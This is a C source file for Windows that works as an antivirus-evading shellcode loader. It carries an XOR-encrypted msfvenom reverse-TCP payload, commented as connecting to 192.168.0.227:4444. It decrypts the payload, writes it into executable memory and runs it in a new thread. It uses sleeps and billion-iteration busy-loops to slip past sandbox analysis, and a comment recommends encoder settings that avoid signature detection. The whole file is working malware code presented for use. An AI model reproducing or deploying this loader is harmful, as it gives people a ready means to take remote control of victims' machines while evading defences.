#include <windows.h>
#include <stdio.h>
#include <stdbool.h>


int main(int argc, char* argv[]){
    sleep(1);
    HANDLE hProc = GetCurrentProcess();

	printf("totally unsuspicious string that is being printed, nothing to worry about!\n");
    if (hProc == NULL){
        printf("[*] Failed to obtain handle, exiting...");
        return 0;
    }
    printf("[*] Obtained handle: %x\n", hProc);

	unsigned char key[] = "\x69\x42\x55\x12\x89\xc2"; // if payload isnt xor encrypted, set key to \x00; when creating msfvenom payload, use -e x86/shikita_ga_nai -i ~10, prevents signature detection
    //sleep(1);
	unsigned char shellcode[] = //payload - reverse tcp to 192.168.0.227:4444
		"\x28\x86\x79\x15\xf3\xe6\x5f\x64\xde\xc9\x82\x62\xa7\x74\x1b\x50\x47\x4a\x85\xbe\xdd\xfe\xf5\xfa\xa9\x8c\xa7\xb2\x91\x30\x24\x68\xf2\x38\xe4\x5f\xd4\x60\xd4\x57\x35\x91\xa1\x30\xba\x3b\xc2\x10\x04\x56\x53\x49\x52\x96\x99\x1e\xda\x61\xb7\x56\x84\x1e\xb6\xca\x8a\xc9\x44\x28\x15\xae\x5b\x28\x83\xed\xe4\x02\xc8\x29\xf3\x7e\x16\x1d\x8d\x56\x4c\x96\x7d\x39\x61\xfa\xd3\x74\xf8\xe8\x4a\x7d\x54\xaf\x16\x9e\x04\xf0\x0e\x04\xc9\x4c\xcb\x72\xcc\x43\xa3\x57\x5f\x0f\xbf\x7e\x7a\x30\x28\x72\x74\xff\xf3\x35\x29\x14\x26\x1e\x3d\x79\x7e\xd6\x23\xaa\x97\xe6\x3a\x14\x06\xea\x21\x11\xac\x74\xbf\x85\x13\x94\x96\x5e\x90\xfc\x9a\x46\x6c\xee\x5b\x44\xbb\x1b\x25\xa0\x36\xdc\x5a\xc2\x53\x9a\x7c\xed\x7e\x57\x2f\x75\x04\x85\x1e\xde\x65\x58\xdd\x8c\xea\x5d\x3a\x55\xa1\x63\xcf\xd9\x14\x52\x33\x33\xeb\x98\x29\xe6\xfd\xf4\x11\x65\xfd\x5a\xcd\xaf\x8a\xa2\x8d\x42\x38\xc6\x61\xaf\x14\x8e\x80\x1b\x7a\x19\x90\xbd\x29\xc5\x59\xab\xdc\x08\x86\x5a\xa5\xa5\xaa\x63\xf6\x6c\x26\xd8\xe6\x2e\xdd\x72\x3d\x26\x72\x7f\x32\x11\x36\x54\x55\x5a\x5c\xd7\x18\x7d\x18\xc7\x4d\x0f\x06\x4e\xe4\x16\x32\xcb\x4c\x22\xa7\x68\x21\x41\xee\x83\xd6\x4b\xad\x58\xe4\xd8\x98\x4f\x51\x67\x3f\xaf\x13\xcc\x1f\x7c\x66\x90\x17\x8f\xcb\x4e\x69\xc0\x45\x2d\x50\xfa\xdc\x74\x9a\xe4\x56\xa4\x52\x94\x29\x1c\xcf\x7d\x15\x78\x8f\xef\x05\x07\x47\x3c\xc6\xcb\x63\x85\x01\xa0\xf4\xb5\x41\x83\xa6\xb3\x09\x95\x2c\x8d\xca\x6b\xa0\xed\x86\x77\xc5\x2c\x23\x2d\x84\xd3\xee\x7a\x51\x87\x22\x65\x62\x8d\x16\x1c\x00\x01\x2c\xd6\x3d\x9d\xda\xc0\x7a\x96\x94\x4a\x31\x3a\xfc\x2a\x6d\x49\xba\x98\x37\x06\x3c\x0e\x8a\x62\x4d\x7b\x2c\x37\x78\x76\x94\x04\x84\xf1\x89\xe7\xac\xc9\xd5\x40\xb6\x30\x96\x3b\x09\x5c\x9d\x2f\x37\x8f\xe5\x1d\x1c\xbf\x5a\x3d\xde\xf4\xe7\x0c\x60\xf8\xa4\xd1\x89\x4d\x7c\x81\x3c\x60\x73\xd5\xdf\x6f\x19\xc0\x7c\xdf\x69\x04\xf6\xca\x51\xfd\x98\xaf\x03\x8a\x71\x0f\x09\x7f\xf9\x1d\x41\x84\x2a\x03\x6d\xe1\x95\xb9\xc6\x07\xe8\x61\x7d\x8b\xba\x15\xbc\x95\x1b\x41\xd3\x1f\xe8\xd6\x23\x91\x2c\xff\xb6\x4a\x82\x98\x9c\xb0\xb6\xdd\x84\x3b\x9d\x4b\x01\xe1\x17\x8a\xaa\x6c\x5e\xff\xb8\x5d\xf4\x06\x89\x32\x22\xaf\x5b\x38\x7a\xa2\x18\x48\xb9\x4a\xf7\x44\xc8\x92\x76\x89\x63\xd4\x0b\x70\x04\xc3\x96\x4c\xc3\x75\xf0\xfc\x2d\xfb\x2e\xe0\xca\x66\xfe\xb0\xa9\x59\xc1\x75\xbd\x62\xc3\xad\x79\xed\x8f\x40\xb1\x15\xa4\xc9\x17\x7c\x0b\x0a\x54\x43\x29\x5a\x5d\xb0\xe6\x6f\x92\x8a\x94\x2f\x5f\x35\x60\xf1\xad\xd5\x24\x80\x58\x6f\x38\x5a\x21\x5f\x41\x38\x43\xca\xb7\x90\xb3\x25\x45\xe8\x3c\xf7\x73\x31\x5a\x70\xbe\x02\x20\xec\x35\xf3\x17\x94\x49\x1c\x98\xdb\xdf\x24\x38\x90\x64\x74\xb0\xb3\xaf\xdf\xf2\x78\x99\x01\x21\xc1\x1a\xd7\xc4\xf6\xe9\x88\x6b\x09\xef\x63\x15\x71\x78\x19\x79\xbf\x75\x32\xe8\xbe\x83\x93\xae\xe6\xfa\xf3\x86\x80\x24\x34\xd4\x79\x0d\xe9\x0c\x39\xe9\x13\x63\xa2\xaa\x07\xef\xde\xbb\x87\x1d\x8c\x55\xc3\x93\xa1\x2f\x53\xab\xe5\xbf\x38\x45\x61\x6a\xf9\xa5\xb4\x51\x2e\x88\x64\xdb\x02\x34\xce\xbf\xec\xaa\xdb\xdf\x44\x01\xae\x79\xa6\xb0\xe2\x91\xb6\x2e\x05\x4b\xdd\x70\x40\x36\x85\x18\xa5\x4f\x0b\x3d\x32\x6a\x9c\xa7\xfa\xa3\xbc\x13\xab\x91\xa0\x47\x04\x44\xc5\x1f\xaa\x4e\xd9\x32\xc9\xc6\x43\x4a\x5b\xc8\x9f\xb7\xba\xf3\x80\x25\x9e\xce\x02\x99\x88\xf6\x92\x5b\x90\xc1\x0b\x43\xf1";
	
	int shellcodesize=780;

    sleep(1);
    for (int i = 0; i < shellcodesize; i++){
		shellcode[i]=shellcode[i]^0xff;
	}
    sleep(3);
	printf("size of key: %d\n", sizeof(key)/sizeof(key[0]));
	for (int i = 0; i < shellcodesize; i++){
		shellcode[i]=shellcode[i]^key[i%(sizeof(key)/sizeof(key[0])-1)];
	}
    



    LPVOID addr_pointer = VirtualAllocEx( // allocate the needed memory
		hProc,
		NULL,
		shellcodesize,
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_EXECUTE_READWRITE
	);

	printf("[*] Pointer to allocated memory: %x\n", addr_pointer);

    //sleep(1);

	bool res = WriteProcessMemory(
		hProc,
		addr_pointer,
		shellcode,
		shellcodesize,
		NULL
	);
	if (res==0){
		printf("something got fucked, exiting...");
		return 0;
	}
	printf("[*] Memory allocated succesfully\n");
	memset(shellcode, 0, sizeof(shellcode));
    sleep(3);

	long long a = 1;
	for (int i = 0; i < 18; i++){
		a*=2;
	}
	a=0;
	for (int i = 0; i < 1000000000; i++){
		a+=1;
	}

	HANDLE hThread = CreateThread(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE) addr_pointer,
		NULL,
		0,
		NULL
	);
	printf("%d", hThread);
	a=0;
	for (long long i = 0; i < 10000000000; i++){
		a+=1;
	}
    WaitForSingleObject(hThread, INFINITE);



	printf("[*] Shellcode injected, exiting...");



    return 0;

}

